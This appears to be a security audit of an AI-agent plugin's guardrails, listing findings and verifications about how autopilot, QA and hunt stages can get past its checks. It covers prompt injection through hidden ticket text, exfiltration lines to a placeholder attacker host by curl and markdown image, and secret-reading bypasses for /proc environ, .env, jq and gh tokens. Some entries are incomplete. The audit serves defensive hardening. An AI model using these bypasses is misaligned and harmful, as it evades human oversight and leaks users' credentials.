findings.title: Root package.json has no lockfile
findings.description: The tracked root package.json (the Pi package manifest) has no lockfile, so nothing pins what an install resolves; npm audit failed with ENOLOCK. It declares no dependencies, so exposure today is nil.
findings.attackPath: Conditional on a later change: a dependency is added without a lockfile, a consumer install resolves the newest version in range, a hijacked release is installed.
findings.mitigationExamined: No dependencies declared; AGENTS.md Rule 1 (zero dependencies) is policy, not enforced in tooling.
findings.fix: Keep the manifest dependency-free and add a gate that fails if a dependencies block appears without a lockfile.

findings.title: The repository's own .gitignore does not ignore .env, .env.* or .dev.vars (the fix landed in the template block only)
findings.description: The 2.3.0 release added .env, .env.* and .dev.vars to templates/_blocks/gitignore.tmpl. This repository's own .gitignore is the 2.0.1 scaffold and ignores only .agents/mcp-secrets.env and *.local.*. The repository is public.
findings.attackPath: A .env or .dev.vars holding a credential is staged with git add . and pushed; the first line of defence is missing.
findings.mitigationExamined: pre-commit gitleaks scan (fails open with a warning when no scanner runs, skipped by --no-verify); GitHub push protection matches provider token formats only.
findings.fix: Run init upgrade mode or copy the template block into .gitignore.

findings.title: Autopilot curl/wget egress allow-list with an empty list is bypassed by any launcher outside the analyzer's wrapper list, including the plugin's own task-done
findings.description: The empty-list fix fires only when the program word is curl or wget (2531-2532, 2551-2552). The unwrap loop (1581) follows only WRAPPERS, env, timeout, xargs and runners; skills/executing-plans/scripts/task-done executes its trailing words (task-done:40). The shell-side host check (qa-guardrail:1146) runs only when qa.hosts.allowed or qa.urls is non-empty; the scaffold ships both empty.
findings.attackPath: Untrusted text steers the execute or qa stage -> it runs task-done ... curl 'https://attacker/c?d=<data>' -> no rule judges the URL -> data reaches the attacker host.
findings.mitigationExamined: Direct curl denied with an empty list; with a non-empty list the text rule catches a literal URL; docs say a regex hook is not a sandbox.
findings.fix: Judge the whole command text with an empty list; add task-done, watch, parallel, make to the unwrapped set; ship OS or proxy egress guidance.

findings.title: Ticket body hidden-text control strips only HTML comments; other invisible channels reach the unattended stage
findings.description: stripHtmlComments and hideComments remove <!-- --> only. Link reference definitions, bogus comments, script/style bodies, alt text, link titles, tag characters, zero-width and bidi controls survive; on Odoo, d-none and display:none spans survive htmlToText (odoo.mjs:120-131). The ready-label binding compares edit time or a raw hash only.
findings.attackPath: Attacker issue with invisible instructions -> maintainer reads rendered text and labels it -> stage reads the raw body -> obeys (fetch attacker URL, shape the plan).
findings.mitigationExamined: Comments from non-collaborators dropped; body edit after label refused; human gate on spec and plan.
findings.fix: Normalize what the stage reads; show the approver the sanitized text or its digest and bind the label to it.

findings.title: Agent-written markdown is posted unsanitized by the engine and task-review; a remote image is an egress channel the host guardrail cannot see
findings.description: Ledger rows, the QA report and the task-review reports are posted verbatim (autopilot-lib.mjs:361, autopilot.mjs:797-943, post-review.mjs:340-386); rewriteLinks touches artifacts/ links only; GitLab neutralizes quick actions only. Odoo renders no .
findings.attackPath: Steered stage writes ![x](https://attacker/p.png?d=<data>) into a ledger row or report -> the engine posts it -> a viewer or the forge fetches the image.
findings.mitigationExamined: The stage's own tools are filtered; the engine's post leaves outside that hook.
findings.fix: Rewrite remote images and autolinks before posting; escape and cap ledger cells.

findings.title: The gate pushes the whole documents branch before any approval, with no check that it holds only the ticket's document paths
findings.description: postPacket pushes state.docs.branch before approval; pushAllowed checks repository and branch name only; no stage-specific write limit exists; CI files other than .github and .gitlab-ci.yml are unprotected.
findings.attackPath: Steered spec or plan stage commits a CI file -> the gate pushes -> CI that builds branches runs it with secrets.
findings.mitigationExamined: Guardrail blocks the stage's own pushes and protects .github and .gitlab-ci.yml; branch protection applies to merge, not to a branch build.
findings.fix: Check git diff --name-only against the ticket's folders before the gate push; extend the protected list.

findings.title: Autopilot protected-path list omits instruction and memory files that later sessions obey and auto-loaded agent code
findings.description: AUTOPILOT_PROTECTED_RE omits .agents/memory/**, nested AGENTS.md, CLAUDE.md, GEMINI.md, QWEN.md, and the auto-loaded agent code of other harnesses (.opencode/plugins, .pi/extensions, .cursor/hooks.json, others).
findings.attackPath: Steered stage writes a memory entry or a plugin file -> committed or left untracked -> a later session or stage loads it.
findings.mitigationExamined: Memory entries are reviewed in the PR; an untracked plugin file never reaches a diff.
findings.fix: Protect .opencode/, .cursor/hooks.json and similar; the memory part is a recorded decision.

findings.title: Config snapshot covers only tickets and autopilot; repos, topology and qa are read live, so a rewritten file steers the engine's pushes and drops the QA gate
findings.description: SNAPSHOT_KEYS is tickets and autopilot; repoDirs (repos.mjs:373-377) and qaConfigured (autopilot.mjs:669-672) read the live file.
findings.attackPath: A script a stage runs rewrites .agents/ultrapowers.json: repos[].path repoints the engine's push and PR; deleting qa skips the QA gate.
findings.mitigationExamined: Direct writes to the file are denied; script-level rewriting is the documented residual.
findings.fix: Snapshot and compare every key the engine or guardrail reads; contain repos[].path.

findings.title: MCP server allow-list for an autopilot stage works only for mcp__server__tool names; other harnesses rely on a tracker-word and verb deny-list

findings.attackPath: Steered watcher stage on a non-Claude harness calls a non-snapshot MCP tool.
findings.mitigationExamined: Claude Code strict MCP config; Codex isolation.
findings.fix: Apply the server allow-list to every harness spelling.

findings.title: Cursor plugin hook commands are cwd-relative (./hooks/run-hook.cmd), the issue-53 class, unmeasured for Cursor

findings.title: Codex guardrail registration relies on ${CLAUDE_PLUGIN_ROOT} expansion by a POSIX shell, with no shell pin; on Windows it may exit non-2 and let every call through

findings.mitigationExamined: Fine on Linux and macOS; nothing covers Codex on Windows.
findings.fix: Measure Codex on Windows; register a form both shells parse, or refuse the Codex watcher on Windows.

findings.mitigationExamined: Needs Windows, Cursor, no bash.

findings.title: Hermes adapter passes `~` paths and `workdir: ~` to a guard that reads them as project-relative; an autopilot stage can write files in the user's home
findings.description: _guardrail_verdict sends raw tool args; Hermes expands ~ in file-tool paths and workdir; the guard resolves ~ as a literal child of the base directory; the only ~ deny covers shell words (qa-shell-writes.mjs:1276).

findings.mitigationExamined: Protected-name patterns still catch ~/.ssh, ~/.hermes keys; QA and hunt areas deny ~ paths; no ~ test exists.
findings.fix: Expand ~ in the adapter and deny any argument still starting with ~.

findings.category: authorization bypass (guard resolves against a different directory)
findings.title: Hermes adapter judges relative paths against the process cwd while Hermes runs them in the session's persisted `cd` directory; a stage can write protected files and files outside the workspace
findings.description: The adapter sends os.getcwd() as the event cwd; Hermes resolves relative paths against the live session cwd; a bare cd is not denied; protected patterns are directory-anchored.
findings.attackPath: terminal cd .agents (allowed), then write_file ultrapowers.json -> judged as a root file -> allowed -> writes .agents/ultrapowers.json.
findings.mitigationExamined: Per-call workdir is bounded; the persisted cd state is not read.
findings.fix: Send the live session cwd or pin an absolute workdir.

findings.title: Hermes adapter's node lookup skips only the working directory, not PATH entries inside the project

findings.category: Authorization bypass: fail-open guardrail on OpenCode V2
findings.title: The OpenCode V2 run guardrail looks for the run record in the wrong directory (ctx.directory does not exist in V2) and is inert for the session's own project
findings.description: setup() reads ctx.directory (538), falls back to process.cwd() (541), registers guardV2Tool(projectDir) (645); V2's context exposes ctx.location; V2 runs one shared local service per user, so process.cwd() is not the session's project; the event's sessionID is ignored; the test fixture passes a made-up directory.
findings.attackPath: V2 execute.before (645) -> guardV2Tool (81-90) -> guardTool(projectDir) (64-73) -> runGuardrail (guardrail-bridge.mjs:213-221) -> activeRun scans only the service cwd and a shell call's workdir -> none -> { deny: false } (:222) -> hooks/qa-guardrail never spawned.
findings.exploit: Not run: a QA run, hunt or stage in project B while the service started elsewhere; injected text drives write or shell calls unguarded.
findings.mitigationExamined: Shell workdir is a candidate; file tools have no per-call directory; QA and hunt reports would say Guardrail not active but the autopilot watcher checks only the harness name.
findings.fix: Use ctx.location.directory and the session's directory per call; deny when a run exists under any candidate.

findings.description: The adapter passes input.tool unchanged; the snapshot rule (qa-guardrail:681) fires only for mcp__?*__?*; the autopilot profile has no default-deny; harnesses.mjs gives OpenCode no MCP restriction.
findings.attackPath: Steered OpenCode stage calls postgres_query from a non-snapshot server -> no rule matches -> allowed.
findings.mitigationExamined: Tracker, mail and git name rules still fire.
findings.fix: Normalise MCP names across spellings or generate an isolated OpenCode config.

findings.category: Untrusted text steering a privileged, unguarded agent

findings.title: A guarded hunt can start a QA run record for itself and swap its own guard profile
findings.description: startRun refuses only the same profile and id and an autopilot marker; the hunt lets node run <plugin>/hooks/lib/run-records.mjs (HUNT_OWN_SCRIPTS_RE, qa-shell-writes.mjs:1077; outside-project regular files, 1163-1167); the run-records refusal (1720-1729) is autopilot-only; pickRun returns the qa record before the hunt record.
findings.attackPath: Hunter runs run-records.mjs start --profile qa --id x -> huntProgramWhy returns '' -> startRun writes qa-x-<hex>.json bound to the session -> pickRun returns qa -> every later call is judged by the weaker QA profile (no program allow-list, no URL-tool refusal, no gh/glab refusals).
findings.exploit: Described, never run: write reviews/x/p.js, run it, or curl any host.
findings.mitigationExamined: MARKER_RE protects the runs folder from direct writes only; the accepted residual covers end after a Verdict line.
findings.fix: Refuse run-records.mjs except end for the run's own id in hunt and QA; refuse start while a live record applies.

findings.title: Entering a folder that holds .agents/ultrapowers.json (worktree, nested project) makes the run's guard inert
findings.description: find_root_r skips a parent's .ultrapowers/runs once past a folder with .agents/ultrapowers.json (138, 150); run-hook.cmd:61-63 the same; a session-bound record is never consulted in a nested root.
findings.attackPath: QA agent calls EnterWorktree (allowed via read_only_re), or a hunter dispatches an isolated Agent or cd's into .claude/worktrees/* -> hook finds no record -> exit 0 at 280.
findings.exploit: Not run; depends on Claude Code's hook cwd.
findings.mitigationExamined: Nested roots are a stated design; the bridge cannot be hidden this way; the autopilot marker counts at any height.
findings.fix: Apply a session-bound record from any ancestor; refuse EnterWorktree and isolation worktree during a run.

findings.category: Command execution / install and network in a read-only profile
findings.title: The hunt runs any regular node or python file outside the project, including npm, npx and pip entry scripts
findings.description: huntProgramWhy lets node and python run a script outside the project that is a regular file (1150-1167); later arguments are unjudged; huntCheck returns null for a script run (688, 874) so the package-manager refusals never see it.
findings.attackPath: python3 /usr/bin/pip3 install x or node .../npm-cli.js install x -> allowed at every step.
findings.exploit: Not run: install and network from a hunt that must install nothing.
findings.mitigationExamined: Scripts inside the project are refused; the outside-script allowance was recorded for the plugin's own scripts.
findings.fix: Allow outside scripts only if they match HUNT_OWN_SCRIPTS_RE.

findings.title: host_of_r reads a backslash or # before @ as userinfo, so a URL for one host is judged as another
findings.description: host_of_r strips ^[^/?@]*@; in http://127.0.0.1\@example.com/ the hook computes example.com while WHATWG parsers reach 127.0.0.1.
findings.attackPath: Fetch or browser navigate with such a url passes forbidden, allowed and non_public_host tests.
findings.mitigationExamined: curl and wget operands refuse these spellings (qa-shell-writes.mjs:1057-1058); URL tools do not.
findings.fix: Refuse backslash, whitespace, @ or # before the first slash; parse with WHATWG URL.

findings.title: The /proc/.../environ refusal is bypassed by a glob in the last segment or by find -name environ
findings.description: ENVIRON_RE (264) and qa-guardrail:1077 need the literal word environ; the glob branch tests only key-file names.
findings.attackPath: cat /proc/self/envir?n -> no rule -> allowed.
findings.mitigationExamined: Typed, //, /./ spellings refused.
findings.fix: Deny glob words under /proc and /proc operands in the hunt.

findings.title: Key-material rule misses brace lists across a slash, ${X:-.env}, $'...' and program-side globs
findings.description: checkAlias judges only literal words and shell globs; expansions with a literal default and cross-segment brace lists pass.
findings.attackPath: cat ${X:-.env} -> dyn part -> no deny -> prints .env.
findings.mitigationExamined: Same-segment braces, //, /./, .. and 8.3 names handled.
findings.fix: Refuse unresolved expansions as reader operands.

findings.category: Secret disclosure (environment via jq and yq)
findings.title: jq and yq environment-read refusals are bypassed ([env], {a:env}, bare envsubst)
findings.description: The jq rule needs env after start, space, | ( ; , ; the yq rule needs env( or strenv(.
findings.attackPath: jq -n '[env]' -> allowed in the hunt.
findings.mitigationExamined: $ENV and env( refused.
findings.fix: Refuse env and envsubst anywhere in a jq or yq program.

findings.title: gh/glab auth status -th or -ta prints the token; the refusal matches only -t\b
findings.description: Clustered short options pass the text rule; the analyzer checks only the verb status.
findings.attackPath: gh auth status -th github.com -> allowed -> prints the token.
findings.mitigationExamined: gh auth token, -t, --show-token alone are refused.
findings.fix: Judge auth status flags in the analyzer.

findings.title: git stash push --all removes the ignored autopilot marker in the session door
findings.description: git stash push is allowed with any flags in the autopilot profile; --all stashes the ignored marker; without the env flag the hook then exits 0; stash pop restores it before end.
findings.attackPath: git stash push --all -> marker gone -> unguarded calls -> git stash pop.
findings.mitigationExamined: rm, mv, find -delete on the marker are refused; the watcher door keeps the env flag.
findings.fix: Refuse stash flags and pathspecs while the marker exists.

findings.title: yq -i is not judged as a write in QA or autopilot, and the hunt's yq check misses -ie and -s.a
findings.description: No yq write branch exists outside the hunt; the hunt regex needs i or s as the last letter of the cluster.
findings.attackPath: yq -i ... .github/workflows/ci.yml in autopilot; yq -ie in the hunt.
findings.mitigationExamined: sed -i, perl -i, awk -i inplace, truncate, tee are judged.
findings.fix: Treat yq -i and -s as writes in every profile.

findings.title: gh/glab read verbs that write files, and gh api to any host, escape the autopilot rules
findings.description: The autopilot READ lists allow gh run download, gh repo clone and glab repo clone without checkTarget; --hostname and :// refusals on gh api are hunt-only.
findings.attackPath: gh run download ... or gh repo clone o/r .github/x writes into protected paths; gh api https://evil/... reaches unlisted hosts.
findings.mitigationExamined: Tracker writes and non-GET api refused.
findings.fix: Refuse download and clone in autopilot; apply the hunt's refusals.

findings.category: Command execution from a listed program
findings.title: sort --compress-program is not refused in the hunt and runs a program on file contents
findings.description: sort is on the hunt list; its only rule is -o/--output; GNU sort runs the compress program on temporary files.
findings.attackPath: sort -S 1k --compress-program=sh reviews/<id>/p.txt.
findings.mitigationExamined: rg --pre, git grep -O, --ext-diff are refused.
findings.fix: Refuse --compress-program and -T.

findings.title: exec -a NAME and time -f FORMAT make the real program look like an unknown one
findings.description: WRAPPER_VALUE_OPTS skips the value as a flag; the real command's write rules never run in QA and autopilot.
findings.attackPath: exec -a x cp a /tmp/b.
findings.mitigationExamined: Other wrappers have their own parsing.
findings.fix: Parse exec and time options.

findings.title: ln makes a hard link whose source is never judged, so a later allowed write edits the source
findings.description: Only the destination of ln and cp is checked.
findings.attackPath: ln src/app.js reviews/<id>/app.js then write the new name.
findings.mitigationExamined: Symlinks refused; the hunt refuses ln.
findings.fix: Refuse hard links in QA; hold sources to protected paths in autopilot.

findings.title: A command with thousands of non-drive write targets can outlast the 30 s hook timeout on Windows
findings.description: Each absolute path spawns cygpath; denies do not stop the walk.
findings.attackPath: Thousands of redirects then the real command; the hook is killed at 30 s.
findings.mitigationExamined: Fast path hardened; this cost sits in the analyzer.
findings.fix: Cache results, cap words and targets, add an analyzer deadline that denies.

findings.title: MCP write detection by verb list misses run, rerun, cancel, transition, trigger, dispatch
findings.description: Names such as run_workflow or transitionJiraIssue pass.
findings.attackPath: A snapshot tracker MCP tool with those verbs.
findings.mitigationExamined: create, update, edit, add, remove, delete, merge, comment, post, save, send refused.
findings.fix: Allow tracker MCP tools only with a read verb.

findings.title: The shell write area follows a symlink at reviews/<id>
findings.description: A committed reviews/<id> -> .. makes the project the shell write area.
findings.attackPath: Audited branch commits the link; echo x > src/app.js.
findings.mitigationExamined: Creating symlinks refused; a pre-existing one is not.
findings.fix: Refuse to start when reviews/<id> is a link.

findings.title: A planted .ultrapowers/runs record guards or blocks every session of a cloned repository and outranks the autopilot marker
findings.description: Any valid-shaped record applies; a future startedAt never expires; records are checked before the autopilot marker.
findings.attackPath: Clone of a repository that tracks a runs record.
findings.mitigationExamined: Writes to runs/ by a run are refused; repository files are not.
findings.fix: Cap startedAt at now; require the run field to match the file name.

findings.title: A two-step name reference reads a credential in autopilot
findings.description: declare -n r; r=GH_TOKEN; echo $r passes; only the one-line form is refused.
findings.attackPath: As described.
findings.mitigationExamined: One-line form, ${!NAME}, declare -p, awk ENVIRON refused.
findings.fix: Refuse -n in every profile except a literal non-credential target.

findings.category: symlink following: secret exposure and file overwrite
findings.title: task-review reads and posts the reviews/<ID> report files through symlinks, and writes TASK-REVIEW.md through them
findings.description: reviewFolderProblem checks the two folders only; readFileSync of TASK-REVIEW.md, QA-REPORT.md and SECURITY-REPORT.md follows a symlink and the text is posted; assemble-review.mjs writes through a link.
findings.attackPath: A branch commits reviews/<ID>/QA-REPORT.md as a symlink to ../../.agents/mcp-secrets.env; the maintainer runs task-review --post; the maintainer's secrets file is posted on the ticket and PR.
findings.mitigationExamined: artifactPath realpath-checks artifacts; assertReportPath guards the autopilot's QA report; these three files were missed.
findings.fix: lstat each report file and refuse links; check the write target in assemble-review.mjs.

findings.category: git configuration trust: the guard is skipped for status
findings.title: autopilot status skips the git-config change guard but still runs git status and git checkout, which start filter drivers
findings.description: context() sets gitConfigChange to null for status, then runs ensureOnTicketBranch; the engine's -c pins do not cover filter.*.
findings.attackPath: A stage script plants a filter driver; a human runs status; git runs the driver in the engine's full environment.
findings.mitigationExamined: Script-level rewriting is a declared residual; tool-call writes to .git are blocked.
findings.fix: Run the comparison for status too and make status read-only.

findings.title: init join points core.hooksPath at the repository's own .githooks without checking the hooks
findings.description: ensureHooksPath never checks that .githooks is the plugin's template.
findings.attackPath: Hostile repository with a malicious pre-commit; user runs join; next commit runs it.
findings.mitigationExamined: join is an explicit user action; the report says core.hooksPath changed.
findings.fix: Compare with the template or show the hooks first.

findings.title: The hunt's DECLARED rows default a dependency to public, so private package names reach the web research step
findings.description: Without a lockfile or with a private registry the host is empty and the row is public.
findings.attackPath: Internal package name with no lockfile goes to the research step as a public lookup.
findings.mitigationExamined: References and lockfile private hosts are marked private.
findings.fix: Mark a row public only when a lockfile shows a public resolved host.

findings.title: Scaffolded Claude settings pre-approve `git diff` but their read-any-file denies miss git's flagless outside-path form, so any readable file prints without a prompt
findings.description: Bash(git diff:*) is allowed (11); the denies (87-95) block --ou*, --no-index, /dev/null; git compares two paths as files when one is outside the work tree, with no flag; git show *:.env* misses sub-folder .env.
findings.attackPath: git diff ~/.aws/credentials README.md -> no deny matches -> prints the file.
findings.exploit: Only --stat on a non-secret system file was run to confirm the git behaviour.
findings.mitigationExamined: Read denies are tool-level; the guardrail is inert outside a run; the test models flags only.
findings.fix: Stop pre-approving git diff:* as a prefix; deny out-of-tree operands; use an OS-level read deny.

findings.title: The scaffolded Chrome DevTools MCP server runs with Google usage statistics and CrUX URL upload enabled
findings.description: No opt-out flags or variables are set for the server's own defaults.
findings.attackPath: A performance trace sends the traced URL to Google's CrUX API.
findings.mitigationExamined: --isolated and --headless limit the profile only.
findings.fix: Add the opt-out flags and a test.

findings.title: The Gemini guardrail hook runs a launcher script that lives in the project, and Gemini's project-hook trust ignores the script's content
findings.description: init writes .gemini/hooks/ultrapowers-guardrail.mjs and registers it by a fixed command string; Gemini identifies a project hook by name and command (per its documentation).
findings.attackPath: A commit rewrites the launcher without touching .gemini/settings.json: attacker code or exit 0.
findings.mitigationExamined: An agent in a run cannot edit it; the exposure is a commit reaching the tree.
findings.fix: Launch from the installed extension, or hash the file into the command.

findings.title: Secret-read denies are an enumerated list: `.env.prod`, `.env.dev`, `.env.preview` and the token stores of other harnesses are readable, while OpenCode's glob denies them
findings.description: A fixed set is denied; other .env.<name> files and harness token stores are not.
findings.attackPath: Read(.env.prod) in an interactive session.
findings.mitigationExamined: qa-guardrail KEY_RE denies .env during a run.
findings.fix: Extend the list or use an OS-level read deny.

findings.title: The generated MCP launcher starts `cmd` and `npx` by bare name, which resolve in the project folder first on Windows
findings.description: NPX_LAUNCHER spawns cmd and npx by bare name with the project as working directory.
findings.attackPath: A committed npx.cmd runs when an approved MCP server starts.
findings.mitigationExamined: Servers need user approval; the file is visible in the diff.
findings.fix: Start ComSpec by absolute path and set NoDefaultCurrentDirectoryInExePath.

verifications.title: A guarded hunt can start a QA run record for itself and swap its own guard profile
verifications.reason: The hunt allows run-records.mjs with any arguments (qa-shell-writes.mjs:1150-1171; the refusal at 1720-1729 is autopilot-only), startRun refuses only the same profile and id (run-records.mjs:124-129), pickRun returns the QA record first (line 169); the QA profile has no program allow-list, URL-tool refusal or gh/glab refusal. Different from and wider than the accepted end residual.

verifications.title: The hunt runs any regular node or python file outside the project, including npm, npx and pip entry scripts
verifications.reason: python3 /usr/bin/pip3 install x and node .../npm-cli.js install x pass every step: huntCheck returns null for a script run (qa-shell-writes.mjs:687, 874), huntProgramWhy returns '' (1163-1165) without reading arguments, no afterGate rule, hook ends exit 0.

verifications.title: Entering a folder that holds .agents/ultrapowers.json (worktree, nested project) makes the run's guard inert
verifications.reason: Code path holds (qa-guardrail:138, 150; session filter only after a root is found) and EnterWorktree and cd are allowed in QA; unseen: whether Claude Code runs the hook with its cwd inside the worktree.

verifications.title: The OpenCode V2 run guardrail looks for the run record in the wrong directory (ctx.directory does not exist in V2) and is inert for the session's own project
verifications.reason: Path holds (.opencode/plugins/ultrapowers.js:538-541, 81-90, 645; guardrail-bridge.mjs:213-222); the repository's own docs and plan concede a long-lived V2 service has no trustworthy process.cwd(); unseen: whether V2 really lacks ctx.directory, per-project plugin instances, the service's cwd.

verifications.title: STEP 0b hands attacker-controlled manifest strings, unfiltered, to a full-tool research subagent that runs before any guardrail
verifications.reason: package.json keys and versions pass push() (hunt-preflight.mjs:146-148) with trim and URL stripping only, render() writes them raw (:629), STEP 0b hands them to an unrestricted subagent before the run record starts; the only control is a prompt sentence; the model's compliance is the unseen step.

verifications.title: The QA agent inherits every tool of the session and the QA guardrail profile does not restrict MCP servers that are not named like a tracker
verifications.reason: qa-guardrail:652-690 judges only tracker-named MCP tools in the QA profile; a non-tracker write with no path, URL or command exits 0 at :936; unseen: whether a non-tracker write connector is connected and approved without a harness prompt; the harm is destructive writes or outbound connectors, not exfiltration to an outsider.

verifications.title: Cursor plugin hook commands are cwd-relative (./hooks/run-hook.cmd), the issue-53 class, unmeasured for Cursor
verifications.reason: hooks-cursor.json:6, 9, 14 are relative and run-hook.cmd:87-93 derives its folder from a relative $0; Cursor's real cwd is unmeasured (README.md:447 asserts, RELEASE-NOTES:278 and 435 say vendor documentation only).

verifications.title: Codex guardrail registration relies on ${CLAUDE_PLUGIN_ROOT} expansion by a POSIX shell, with no shell pin; on Windows it may exit non-2 and let every call through
verifications.reason: hooks-codex.json:9 has no shell pin while the repository says cmd and PowerShell cannot parse it (docs/windows/polyglot-hooks.md:14-20); how Codex launches hooks on Windows is not shown; the watcher's liveness check only confirms the marker file.

verifications.title: The autopilot stage's MCP allow-list only judges names shaped mcp__<server>__<tool>, so OpenCode's <server>_<tool> MCP tools bypass it
verifications.reason: Code path holds (qa-guardrail:681; no autopilot default-deny; no OpenCode MCP flag); README and docs say isolation is Claude Code only but the release note claims it unqualified; unseen: OpenCode's runtime naming and which servers load; Pi overstated. Also covers the ai-surface lane's finding on the same root cause.

verifications.title: Hermes adapter passes `~` paths and `workdir: ~` to a guard that reads them as project-relative; an autopilot stage can write files in the user's home
verifications.reason: Guard side walked end to end (guard-paths.mjs:54-67, qa-guardrail:520, 815-836, no ~ check); unseen: that Hermes write_file expands ~ (the repository shows only read_file); the workdir variant is incidentally denied in the ordinary install.

verifications.title: Hermes adapter judges relative paths against the process cwd while Hermes runs them in the session's persisted `cd` directory; a stage can write protected files and files outside the workspace
verifications.reason: Adapter sends os.getcwd() (.hermes-plugin/__init__.py:351), the directory-anchored protected patterns do not match a bare name (qa-guardrail:815-836), a standalone cd is not denied (qa-shell-writes.mjs:1807-1814); the installed Hermes source (outside the repository) keeps the session cd and resolves relative file paths against it.

verifications.title: Scaffolded Claude settings pre-approve `git diff` but their read-any-file denies miss git's flagless outside-path form, so any readable file prints without a prompt
verifications.reason: Bash(git diff:*) allow (settings.json.tmpl:11); no deny at 87-95 matches the two-path form; Read denies do not govern Bash; the guardrail is inert outside a run (qa-guardrail:280); unseen: any Claude Code prompt for out-of-tree git operands or a user-enabled sandbox.

verifications.title: The Gemini guardrail hook runs a launcher script that lives in the project, and Gemini's project-hook trust ignores the script's content
verifications.reason: Code path holds (init.mjs:53, 146-151); Gemini's trust model is vendor behaviour the repository does not record; a committer can already delete the hook entry, so the launcher adds only a possible bypass of the first-sight warning; severity worth rechecking.

verifications.title: Autopilot curl/wget egress allow-list with an empty list is bypassed by any launcher outside the analyzer's wrapper list, including the plugin's own task-done
verifications.reason: Direct curl denied with an empty list (qa-shell-writes.mjs:2532) but a launcher outside the unwrap loop such as task-done (executes its arguments at task-done:40) is never judged and qa-guardrail:1146 skips its host check; the hunter's bash ... -s form is incidentally denied (1957) but the direct form passes; capability is a subset of the documented script residual.

verifications.title: Ticket body hidden-text control strips only HTML comments; other invisible channels reach the unattended stage
verifications.reason: fetch-ticket.mjs:326-369 strips only <!-- --> and odoo.mjs:120-131 keeps hidden-element text; the research stages may fetch any public host with an unchecked query; the label binding compares edit time or a raw hash, never what the approver saw; model-following and platform rendering unseen.

verifications.title: Agent-written markdown is posted unsanitized by the engine and task-review; a remote image is an egress channel the host guardrail cannot see
verifications.reason: Ledger cells, the QA report and post-review text reach GitHub and GitLab with remote images untouched and the engine's post bypasses the stage's host rules; unseen: the forge or viewer fetching the image (camo, GitLab CSP) and the injection that steers the stage.

verifications.title: The gate pushes the whole documents branch before any approval, with no check that it holds only the ticket's document paths
verifications.reason: No stage-specific write limit, CI files other than .github and .gitlab-ci.yml unprotected, postPacket pushes the whole branch (autopilot.mjs:777) with a name check only; whether the push starts CI with secrets depends on the target project; this repository's ci.yml triggers only on dev and main.

verifications.title: Autopilot protected-path list omits instruction and memory files that later sessions obey and auto-loaded agent code
verifications.reason: The memory and nested-AGENTS.md part is a recorded decision (12e150f, RELEASE-NOTES v2.1.0); what stands is that .opencode/plugins|tools|agents|commands and .cursor/hooks.json are unprotected, the class commit 711e50e protected for .mcp.json; the verifier judged it a defence-in-depth gap nearer Low.

verifications.title: Config snapshot covers only tickets and autopilot; repos, topology and qa are read live, so a rewritten file steers the engine's pushes and drops the QA gate
verifications.reason: Only tickets and autopilot come from the snapshot (autopilot.mjs:254); repoDirs and qaConfigured read the live file; the git-config baseline holds begin-time directories only; prerequisite is the documented script residual, so the added impact (evaded remote baseline, silent QA drop) is a hardening gap.

verifications.title: Spec, plan and changes stages may fetch any public host with no check of the URL's content; the host test is textual, so DNS names that resolve to private addresses pass
verifications.reason: The open egress is the owner's recorded decision (GH-59 Spec D8, README:402); the residual is that non_public_host and linkFetchable judge hosts by text; a Claude Code WebFetch upgrades http, cannot send metadata headers and returns cross-host redirects; unseen: which fetch tool a stage uses and where the watcher host runs.

verifications.title: task-review reads and posts the reviews/<ID> report files through symlinks, and writes TASK-REVIEW.md through them
verifications.reason: reviewFolderProblem lstat-checks only the two folders; post-review.mjs:302-317 and 397-401 read the report files through a link and post unredacted; assemble-review.mjs:582-584 writes through a link; only assertReportPath and artifactPath check files; unseen: a Windows checkout with core.symlinks=false materializes the link as text.

verifications.title: autopilot status skips the git-config change guard but still runs git status and git checkout, which start filter drivers
verifications.reason: autopilot.mjs:283 nulls gitConfigChange for status and :290 runs ensureOnTicketBranch; repos.mjs:247 (git status runs clean filters on stat-dirty files) runs in the engine's full environment; gitArgs pins no filter.*; foothold is the declared script residual, so low-to-medium.

verifications.title: host_of_r reads a backslash or # before @ as userinfo, so a URL for one host is judged as another
verifications.reason: host_of_r (qa-guardrail:860-867) returns example.com for http://127.0.0.1:8080\@example.com/ while a WHATWG consumer reads 127.0.0.1; no rule in the URL-tool section refuses it; the curl/wget refusal is never applied to URL tools; no fixture, release note or spec records it as accepted.

verifications.title: The /proc/.../environ refusal is bypassed by a glob in the last segment or by find -name environ
verifications.reason: cat /proc/self/envir?n and /proc/self/env* match no rule (ENVIRON_RE :264 and qa-guardrail:1077 need the literal word; the glob branch :1336 tests key-file names only); the find and recursive-grep variants are nearer the documented pattern-guard limit; /proc/<pid>/environ under Git Bash on Windows not verified.

verifications.title: Key-material rule misses brace lists across a slash, ${X:-.env}, $'...' and program-side globs
verifications.reason: cat ${X:-.env} tokenizes to a dyn part (qa-shell-writes.mjs:128-144), checkAlias tests only the empty literal, qa-guardrail:1072 needs a different preceding character; cat {/dev/null,.env} and find -name '?env' also pass; plain $'.env' is caught and git add -f is refused outside autopilot.

verifications.title: jq and yq environment-read refusals are bypassed ([env], {a:env}, bare envsubst)
verifications.reason: The regexes at 1141 and 2215 need env after start, whitespace or | ( ; , so [env], {a:env} and env["NAME"] pass; the yq rules need env( or strenv(; no test covers it; the release note claims jq/yq environment reads are refused.

verifications.title: gh/glab auth status -th or -ta prints the token; the refusal matches only -t\b
verifications.reason: qa-guardrail:978 matches -t\b or --show-token only; the analyzer (qa-shell-writes.mjs:2338-2342) checks the verb status and never its flags; quote-split --show-token also passes; the QA profile has no gh/glab rule at all.

verifications.title: git stash push --all removes the ignored autopilot marker in the session door
verifications.reason: qa-shell-writes.mjs:2150-2151 allows git stash push with any flags; --all stashes the ignored marker; without ULTRAPOWERS_AUTOPILOT_INSIDE the hook exits 0 (qa-guardrail:280); stash pop restores it before runEnd's check (autopilot.mjs:1415); not reached in the watcher door or in QA and hunt.

verifications.title: yq -i is not judged as a write in QA or autopilot, and the hunt's yq check misses -ie and -s.a
verifications.reason: No yq write branch in QA or autopilot (documented deny-list limit); in the hunt the regex at 1139 misses valid spellings such as -ie, -iP, -i=true and -s.a, a defect in a program allow-list that claims to refuse yq writes.

verifications.title: gh/glab read verbs that write files, and gh api to any host, escape the autopilot rules
verifications.reason: The gh branch (qa-shell-writes.mjs:2293-2342) never calls checkTarget, so gh run download and gh repo clone <protected dir> write into protected paths (gh release download only through a quoted spelling that slips qa-guardrail:973); gh api <URL>, --hostname and GH_HOST are refused only in the hunt.

verifications.title: sort --compress-program is not refused in the hunt and runs a program on file contents
